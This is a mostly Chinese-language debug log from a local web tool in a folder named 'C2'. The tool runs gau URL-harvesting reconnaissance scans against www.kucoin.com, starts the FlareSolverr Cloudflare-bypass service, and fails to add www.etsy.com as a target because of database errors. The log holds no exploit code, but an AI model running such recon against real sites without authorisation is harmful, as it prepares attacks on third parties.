2025-06-22 21:13:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:56] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:13:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:13:59] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:05] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:08] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:20] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:23] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:26] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:32] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:35] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:38] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:41] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:44] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:45 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-22 21:14:45 | INFO     | thread_gau.py:291 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-22 21:14:45 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-22 21:14:45 | INFO     | thread_gau.py:303 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-22 21:14:45 | INFO     | thread_gau.py:149 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-22 21:14:45 | INFO     | thread_gau.py:149 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-22 21:14:45 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-22 21:14:45 | INFO     | thread_gau.py:328 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-22 21:14:45 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1750598024.txt
2025-06-22 21:14:45 | INFO     | thread_gau.py:372 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1750598024.txt
2025-06-22 21:14:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:47] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:14:47 | INFO     | Gau_route.py:198 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:14:47 | INFO     | Gau_route.py:198 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:14:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:47] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-22 21:14:47 | INFO     | Gau_route.py:212 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:14:47 | INFO     | Gau_route.py:212 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:14:47 | INFO     | Gau_route.py:217 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:14:47 | INFO     | Gau_route.py:217 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:14:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:14:47] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-22 21:23:46 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:23:46 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:23:46 | INFO     | Gau_route.py:107 | gau_scan() | 已更新現有掃描結果: target_id=1
2025-06-22 21:23:46 | INFO     | Gau_route.py:107 | gau_scan() | 已更新現有掃描結果: target_id=1
2025-06-22 21:23:46 | INFO     | Gau_route.py:119 | gau_scan() | 數據庫操作成功完成: target_id=1
2025-06-22 21:23:46 | INFO     | Gau_route.py:119 | gau_scan() | 數據庫操作成功完成: target_id=1
2025-06-22 21:23:46 | INFO     | Gau_route.py:164 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-22 21:23:46 | INFO     | Gau_route.py:164 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-22 21:23:46 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-22 21:23:46 | INFO     | thread_gau.py:99 | _create_or_update_scan_result() | 更新現有Gau掃描結果，目標ID: 1
2025-06-22 21:23:46 | INFO     | thread_gau.py:482 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-22 21:23:46 | INFO     | thread_gau.py:99 | _create_or_update_scan_result() | 更新現有Gau掃描結果，目標ID: 1
2025-06-22 21:23:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:23:46] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-22 21:23:46 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1750598626.txt --threads 50 --timeout 20 --retries 2 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:23:46 | INFO     | thread_gau.py:255 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1750598626.txt --threads 50 --timeout 20 --retries 2 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:23:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:23:49] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:23:55 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:23:55 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:23:55 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:23:55 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:23:55 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:23:55 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:23:55 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:23:55 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:23:55 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-22 21:23:59 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-22 21:23:59 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-22 21:23:59 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:23:59 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:23:59 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-22 21:23:59 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-22 21:24:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:02 | INFO     | Gau_route.py:387 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-22 21:24:02 | INFO     | Gau_route.py:387 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-22 21:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:02] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-22 21:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:02] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-22 21:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:02] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-22 21:24:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:02] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-22 21:24:04 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:24:04 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:24:04 | INFO     | Gau_route.py:107 | gau_scan() | 已更新現有掃描結果: target_id=1
2025-06-22 21:24:04 | INFO     | Gau_route.py:107 | gau_scan() | 已更新現有掃描結果: target_id=1
2025-06-22 21:24:04 | INFO     | Gau_route.py:119 | gau_scan() | 數據庫操作成功完成: target_id=1
2025-06-22 21:24:04 | INFO     | Gau_route.py:119 | gau_scan() | 數據庫操作成功完成: target_id=1
2025-06-22 21:24:04 | INFO     | Gau_route.py:164 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-22 21:24:04 | INFO     | Gau_route.py:164 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-22 21:24:04 | INFO     | thread_gau.py:494 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-22 21:24:04 | INFO     | thread_gau.py:494 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-22 21:24:04 | INFO     | thread_gau.py:111 | _create_or_update_scan_result() | 更新現有Gau掃描結果，目標ID: 1
2025-06-22 21:24:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:04] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-22 21:24:04 | INFO     | thread_gau.py:111 | _create_or_update_scan_result() | 更新現有Gau掃描結果，目標ID: 1
2025-06-22 21:24:04 | INFO     | thread_gau.py:267 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1750598644.txt --threads 50 --timeout 120 --retries 5 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:24:04 | INFO     | thread_gau.py:267 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1750598644.txt --threads 50 --timeout 120 --retries 5 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-22 21:24:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:07] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:10] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:13] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:16] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:19] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:22] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:25] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:28] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:31] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:34] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:37] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:40] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:43] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:46] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:48 | INFO     | thread_gau.py:303 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-22 21:24:48 | INFO     | thread_gau.py:303 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-22 21:24:48 | INFO     | thread_gau.py:315 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-22 21:24:48 | INFO     | thread_gau.py:315 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-22 21:24:48 | INFO     | thread_gau.py:161 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-22 21:24:48 | INFO     | thread_gau.py:161 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-22 21:24:48 | INFO     | thread_gau.py:340 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-22 21:24:48 | INFO     | thread_gau.py:340 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-22 21:24:48 | INFO     | thread_gau.py:384 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1750598644.txt
2025-06-22 21:24:48 | INFO     | thread_gau.py:384 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1750598644.txt
2025-06-22 21:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:49] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:24:49 | INFO     | Gau_route.py:198 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:24:49 | INFO     | Gau_route.py:198 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:49] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-22 21:24:49 | INFO     | Gau_route.py:212 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:24:49 | INFO     | Gau_route.py:212 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:24:49 | INFO     | Gau_route.py:217 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:24:49 | INFO     | Gau_route.py:217 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:24:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:24:49] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-24 14:56:16 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:56:16 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:56:16 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:56:16 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:56:16 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:56:16 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:56:16 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:56:16 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:56:16 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 14:56:20 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 14:56:20 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 14:56:20 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:56:20 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:56:20 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 14:56:20 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 14:56:24 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:56:24 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-24 14:56:24 | INFO     | index_routes.py:17 | index() | 查詢到 2 個目標
2025-06-24 14:56:24 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.032s)
2025-06-24 14:56:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:56:24] "GET / HTTP/1.1" 200 -
2025-06-24 14:56:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:56:24] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:56:25 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:56:25 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.001s)
2025-06-24 14:56:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:56:25] "GET /add_target HTTP/1.1" 200 -
2025-06-24 14:56:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:56:25] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:56:29 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:56:29 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.kucoin.com', target_ip='https://www.etsy.com/'
2025-06-24 14:56:29 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:56:29 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:56:29 | ERROR    | index_routes.py:90 | add_target() | ❌ 添加目標失敗: 'target_port' is an invalid keyword argument for Target
2025-06-24 14:56:29 | ERROR    | index_routes.py:90 | add_target() | ❌ 添加目標失敗: 'target_port' is an invalid keyword argument for Target
2025-06-24 14:56:29 | ERROR    | index_routes.py:91 | add_target() | 詳細信息: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:56:29 | ERROR    | index_routes.py:91 | add_target() | 詳細信息: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:56:29 | ERROR    | index_routes.py:92 | add_target() | 數據庫操作失敗: 'target_port' is an invalid keyword argument for Target
2025-06-24 14:56:29 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.002s)
2025-06-24 14:56:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:56:29] "POST /add_target HTTP/1.1" 200 -
2025-06-24 14:56:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:56:29] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:57:20 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:57:20 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.kucoin.com', target_ip='https://www.etsy.com/'
2025-06-24 14:57:20 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:57:20 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:57:20 | ERROR    | index_routes.py:90 | add_target() | ❌ 添加目標失敗: 'target_port' is an invalid keyword argument for Target
2025-06-24 14:57:20 | ERROR    | index_routes.py:90 | add_target() | ❌ 添加目標失敗: 'target_port' is an invalid keyword argument for Target
2025-06-24 14:57:20 | ERROR    | index_routes.py:91 | add_target() | 詳細信息: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:57:20 | ERROR    | index_routes.py:91 | add_target() | 詳細信息: target_ip=https://www.etsy.com/, domain=www.kucoin.com
2025-06-24 14:57:20 | ERROR    | index_routes.py:92 | add_target() | 數據庫操作失敗: 'target_port' is an invalid keyword argument for Target
2025-06-24 14:57:20 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.001s)
2025-06-24 14:57:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:57:20] "POST /add_target HTTP/1.1" 200 -
2025-06-24 14:57:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:57:20] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 14:57:30 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:57:30 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 14:57:30 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:57:30 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 14:57:30 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:57:30 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 14:57:30 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:57:30 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 14:57:30 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 14:57:34 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 14:57:34 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 14:57:34 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:57:34 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 14:57:34 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 14:57:34 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 14:57:34 | INFO     | config.py:209 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-24 14:57:34 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.etsy.com', target_ip='https://www.etsy.com/'
2025-06-24 14:57:34 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-24 14:57:34 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-24 14:57:34 | ERROR    | index_routes.py:89 | add_target() | ❌ 添加目標失敗: (sqlite3.IntegrityError) NOT NULL constraint failed: target.target_port
[SQL: INSERT INTO target (target_ip, domain, target_status, deep_scan) VALUES (?, ?, ?, ?)]
[parameters: ('https://www.etsy.com/', 'www.etsy.com', 'pending', 0)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 14:57:34 | ERROR    | index_routes.py:89 | add_target() | ❌ 添加目標失敗: (sqlite3.IntegrityError) NOT NULL constraint failed: target.target_port
[SQL: INSERT INTO target (target_ip, domain, target_status, deep_scan) VALUES (?, ?, ?, ?)]
[parameters: ('https://www.etsy.com/', 'www.etsy.com', 'pending', 0)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 14:57:34 | ERROR    | index_routes.py:90 | add_target() | 詳細信息: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-24 14:57:34 | ERROR    | index_routes.py:90 | add_target() | 詳細信息: target_ip=https://www.etsy.com/, domain=www.etsy.com
2025-06-24 14:57:34 | ERROR    | index_routes.py:91 | add_target() | 數據庫操作失敗: (sqlite3.IntegrityError) NOT NULL constraint failed: target.target_port
[SQL: INSERT INTO target (target_ip, domain, target_status, deep_scan) VALUES (?, ?, ?, ?)]
[parameters: ('https://www.etsy.com/', 'www.etsy.com', 'pending', 0)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 14:57:34 | INFO     | config.py:214 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.025s)
2025-06-24 14:57:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 14:57:34] "POST /add_target HTTP/1.1" 200 -
